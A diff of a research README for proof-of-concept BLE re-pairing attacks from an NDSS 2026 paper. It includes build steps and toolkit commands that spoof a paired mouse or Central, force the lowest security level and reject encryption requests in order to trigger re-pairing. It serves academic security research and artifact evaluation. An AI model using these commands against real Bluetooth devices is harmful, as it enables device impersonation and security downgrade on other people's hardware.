@@ -1,10 +1,8 @@
-# BLERP: BLE Re-Pairing Attacks and Defenses
+# BLE Re-Pairing Attacks PoC
 
-This repository contains everything that was developed for the BLERP paper: the toolkit for the attacks, the fixes, and the ProVerif model.
+This repository contains the attacks PoCs as described in the paper [BLERP: BLE Re-Pairing Attacks and Defenses](TODO) published at NDSS 26'.
 
-Everything  is also available at [doi.org/10.5281/zenodo.17671927](https://doi.org/10.5281/zenodo.17671927)
-
-The NDSS 26' paper is available at  
+The artifact is also available at [doi.org/10.5281/zenodo.17671927](https://doi.org/10.5281/zenodo.17671927)
 
 ## Requirements
 
@@ -14,7 +12,6 @@ The NDSS 26' paper is available at
 
 **Software:**
 
-  * Linux
   * [Segger JLink](https://www.segger.com/downloads/jlink/)
   * [Apache newt v1.9.0](https://mynewt.apache.org/latest/newt/install/newt_linux.html)
   * Python 3.12.0 (MitM attack only)
@@ -22,64 +19,81 @@ The NDSS 26' paper is available at
 
 ## Toolkit Setup
 
-1.  Clone this repository `git clone github.com/sacca97/blerp.git`
-2.  Move into the cloned repository and run `setup.sh`. It will set up the workspace in a subfolder called _blerpae_.
-3.  Move into the new folder and run `apply_attacks_patches.sh`. It will patch the NimBLE stack to perform the attacks. 
-4.  Modify the `Makefile` by setting the `centralid` variable to your board's 10-digit serial number which can be found on the board itself.
-5.  Connect the board to your system via USB and run `make boot-10056 && make central` to build and install the OS and the bleshell application.
-6. Connect to the board using the serial tool, e.g., `tio /dev/serial/by-id/your_board_id`. Once connected, press Enter and then Tab to show the list of available commands.
+1. Setup the workspace
+
+```bash
+git clone github.com/sacca97/blerp.git
+cd blerp
+./setup.sh
+cd blerp_poc
+./apply_attacks_patches.sh
+```
+
+2. Connect the board via USB and install the OS and _bleshell_ app (`ceid` is the actual S/N of the board)
+
+```bash
+make boot-10056 && make central ceid=0123456789
+```
+
+3. Connect to the board using the serial tool, in our case
+
+```bash
+tio /dev/serial/by-id/usb-SEGGER_J-Link_000123456789-if00
+```
+
+Once connected, pressing Tab will show the list of available commands.
 
 
 ## Testing Peripheral Impersonation
 
-This attack maps to Section IV.B of the paper. The user must pair the target Peripheral with a Central device (e.g., a mouse with a laptop or smartphone). We assume the use of a mouse and an Android device. 
+This attack maps to Section IV.B of the paper. The user must pair the target Peripheral with a Central device (e.g., a mouse with a laptop or smartphone). Here we assume a mouse with a random BLE address.
 
 The mouse must be paired with the Android device and turned off (or out of range) during the test. Then the user starts by setting the mouse Bluetooth address in the toolkit with:
 
-The user must first set the spoofed Bluetooth address with:
+1. Configure the board to spoof the Peripheral, send a fake _authreq_ value, have the lowest security settings, and reject one encrption request
 
 ```sh
-set addr=MAC_Address addr_type=random
-```
+# Address type can be random or public
+spoof-address addr=MAC_Address addr_type=random
 
-Where `addr` and `addr_type` shall match the ones of the impersonated device. The MAC address of the mouse can be viewed in Android settings (it's random by default). Then set the advertisement data with:
+# Appearance=962 refers specifically to mice
+spoof-advertise-data name="MX Master 3" appearance=962
 
-```sh
-spoofing-set-adv-data name="MX Master 3" appearance=962
-```
+# Request maximum security
+spoof-authreq mitm=1 bond=1 sc=1 keypress=1
 
-Where the values depend on the impersonated device (in our case, a Logitech MX Master 3 mouse). Then, specify a crafted security level for the security request with:
-
-```sh
-spoofing-set-authreq mitm=1 bond=1 sc=1 keypress=1
-```
-
-By setting all values to 1, we use the maximum authreq value, thereby maximizing the chance of triggering re-pairing. In cases such as the NimBLE implementation bug, one could set \texttt{bond=0} to trigger re-pairing regardless of other values. Then, by running:
-
-```sh
+# Actually support lowest security
 security-set-data mitm=0 sc=0 keysize=7
+
+# Reject one encryption request only
+blerp-reject-enc val=1
 ```
 
-The user can modify the actual re-pairing parameters and force the lowest possible security settings. Lastly, to toggle encryption rejection in the Controller, the user shall use:
+2. Start advertising and wait for the victim Central to connect. Once it happens, the attack starts automatically.
 
-```sh
-blerp-set-flag val=1
+```bash
+# Must be the same address type of spoof-address
+advertise own_addr_type=random
 ```
 
-Where `val` changes depending on the target device. For example, Apple devices require two rejections, while others require only one. After configuring the stack, the user can start advertising via the `advertise` command and wait for the victim to connect. Once the victim connects, the attack starts automatically. Depending on the target device and re-pairing configuration, there may be a visual prompt to confirm the operation, such as a dialog box with an OK button.
-
+If the victim disconnect after the encryption request rejection, the device is not vulnerable.
 
 ## Testing Central Impersonation
 
 This attack maps to Section IV.C of the paper. The user is required to pair the target Peripheral with a Central device, as in the Peripheral Impersonation, with the only difference that, in this case, the Central must be turned off (or brought out of range).
 
-Once the devices are ready, the user must configure the malicious device using the `set` and `security-set-data` as in the PI attack. Then, instead of advertising, the user shall initiate a connection using:
+Devices are configured as in the Peripheral Impersonation attack. The attack starts when a connection is initiated
 
 ```sh
-connect addr=MAC_Address
-```
+# Centrals usually have public addresses
+spoof-address addr=MAC_Address addr_type=public
 
-which automatically triggers a re-pairing attempt.
+# Actually support lowest security
+security-set-data mitm=0 sc=0 keysize=7
+
+# Peripherals usually have random addresses
+connect addr=MAC_Address addr_type=random
+```
 
 ## Double-channel MitM
 
